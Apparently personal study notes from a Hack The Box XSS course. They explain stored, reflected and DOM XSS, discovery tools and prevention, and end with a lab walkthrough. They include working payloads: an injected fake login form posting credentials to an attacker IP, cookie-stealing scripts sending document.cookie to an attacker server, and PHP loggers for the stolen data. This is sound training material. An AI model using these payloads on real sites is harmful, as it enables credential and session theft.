* What is XSS?
	* not properly sanitized user input
	* malicious user can inject extra JS code, so once another user views this page, they unknowingly execute the injected payload
* client-side vulnerability
	* affects the user executing it
* XSS attacks
	* steal session cookie of victim 
	* execute API call that lead to malicious actions (like changing user's password)
* XSS attacks execute within browser JS engine (V8 in Chrome)
	* no system-wide JS code to do something like system-level execution
	* also limited to same domain of vulnerable website

# XSS Testing Payloads
```html
<script>alert(window.origin)</script>
```
Tip: Alert window.origin, because then the alert shows from which source the XSS Vulnerability actually originated. This can be useful, when webpages use iframes
```html
<plaintext>
```
This will stop rendering the HTML code that comes after it 
```html
<script>print()</script>
```
This will popup the browser print dialoge, which is unlikely to be blocked by any browsers
```html
<img src="" onerror=alert(window.origin)>
```
Script tag payload will not execute within vulnerable innerHTML usage. Thus we can use img src with a broken image and use an inline event handler to execute our payload
# Stored XSS
* also called persistent XSS
* if injected payload gets stored in the back-end database and retrieved when visiting the page, this means that the XSS attack is persistent
* most critical type of XSS
	* affects a much wider audience since any user visiting the page is affected

# Reflected XSS
* Reflected XSS vulnerabilities occur when input reaches back-end and gets returned without being filtered or sanitized
* not persistent
* exploiting: send a maliciously crafted URL and send it to victim
* XSS payload in ? query parameters of HTTP GET requests

# DOM XSS
* DOM XSS occurs when JS is used to change the page source through `Document Object Model` (DOM)
* client-side
* can for example happen over URL fragment (#) which is client-side only
* Source & Sink
	* source is a JS object that takes user input
	* sink is the function that write the user input to a DOM Object on the page
	* if sink does not properly sanitize, it would be vulnerable to an XSS attack
* Common used DOM objects:
	* document.write()
	* DOM.innerHTML
	* DOM.outerHTML
* jQuery functions that write to DOM:
	* add()
	* after()
	* append()

# XSS Discovery
* Automated Discovery
	* Web App Vulnerability Scanners: Nessus, Burp Pro or ZAP
	* XSS Strike (https://github.com/s0md3v/XSStrike)
		* Usage: `lunims@htb[/htb]$ python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"`
	* Brute XSS (https://github.com/rajeshmajumdar/BruteXSS)
	* XSSer (https://github.com/epsylon/xsser)
* Manual Discovery:
	* manually testing various XSS Payloads
	* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md
	* https://github.com/payload-box/xss-payload-list
	* XSS is not exclusive to HTML input fields, but can also come from HTTP headers like Cookie or User-agent

# XSS Attacks
## Defacing
* defacing means changing a websites look for anyone who visists the website
* common for hacker groups to deface a website to claim that they had succefully hacked it
* Defacement elements:
	* Background Color `document.body.style.background`
	* Background `document.body.background`
	* Page Title `document.title`
	* Page Text `DOM.innerHTML`
* Changing background:
```html
<script>document.body.style.background = "#141d2b"</script>
```
* Changing page title
```html
<script>document.title = 'HackTheBox Academy'</script>
```
* Changing Page Text
```javscript
document.getElementById("todo").innerHTML = "New Text"
``` 
or wirth jQuery (needs to be imported)
```javscript
$("#todo").html('New Text');
```
## Interactive Phishing
* phishing usually utilize legitimate-looking information to trick the victims into sending their sensitive information to attacker
* common XSS phishing approach: Inject fake login page forms that send the login details to attacker server
```html
<script>document.write('<h3>Please login to continue</h3><form action=http://10.10.15.53><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script>
```

```php
<?php 
if (isset($_GET['username']) && isset($_GET['password'])) { 
	$file = fopen("creds.txt", "a+"); 
	fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n"); 
	header("Location: http://SERVER_IP/phishing/index.php"); 
	fclose($file); 
	exit(); 
} 
?>
```

```shellsession
lunims@htb[/htb]$ mkdir /tmp/tmpserver lunims@htb[/htb]$ cd /tmp/tmpserver lunims@htb[/htb]$ vi index.php #at this step we wrote our index.php file lunims@htb[/htb]$ sudo php -S 0.0.0.0:80 PHP 7.4.15 Development Server (http://0.0.0.0:80) started
```

## Session Hijacking
* aka Cookie Stealing
* Blind XSS:
	* XSS vulnerability occurs on a page we do not have access to
	* use JS payload that sends HTTP request to our server
* https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#exploit-code-or-poc
```javascript
document.location='http://OUR_IP/index.php?c='+document.cookie; 
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```
```php
<?php 
if (isset($_GET['c'])) { 
	$list = explode(";", $_GET['c']); 
	foreach ($list as $key => $value) { 
		$cookie = urldecode($value); 
		$file = fopen("cookies.txt", "a+"); 
		fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n"); 
		fclose($file); 
	} 
} 
?>
```

# XSS Prevention
* **Front-end**
	* Input Validation
	* Input Sanitization
		* https://github.com/cure53/DOMPurify
	* Direct input:
		* ensure that user input is never directly used within HTML tags
	* JS Functions that can lead to XSS
		* DOM.innerHTML
		* DOM.outerHTML
		* document.write()
		* document.writeln()
		* document.domain
	* jQuery
		* html()
		* parseHTML()
		* add()
		* append()
		* prepend()
		* after()
		* insertAfter()
		* before()
		* insertBefore()
		* replaceAll()
		* relaceWith()
* **Back-end**
	* Input Validation
	* Input Sanitization
	* Output HTML Encoding
		* PHP: `htmlspecialchars` or `htmlentities`
	* Server Configuration:
		* set Security Headers like CSP or X-Content-Type-Options=nosniff
		* HTTP Only and Secure flags for cookies

# Skill Assessment
At first i tested the search function with some basic XSS Payloads. However, after looking into the source code with my payloads in it, i see that it gets escaped and this is probably a dead-end.

So i went to the Security Blog page, which allows us to leave comments. After posting a comment, we see that comments need to be moderated first: "_Your comment is awaiting moderation. This is a preview; your comment will be visible after it has been approved._"

So we are probably looking for a Blind XSS. So we start up a php server with `sudo php -S 0.0.0.0:80` and try following payload for the respective input fields:
`"><script src=http://<attacker_ip>/script.js></script>`.
In our log from the php server we actually see, that the Website input field is vulernable. 

We craft a XSS Payload that sends us the cookie:
```html
"><script>new Image().src='http://<attacker_ip>/index.php?c='+document.cookie;</script>
```
When sending this, we can actually see in our console that the cookie gets logged along with flag inside it.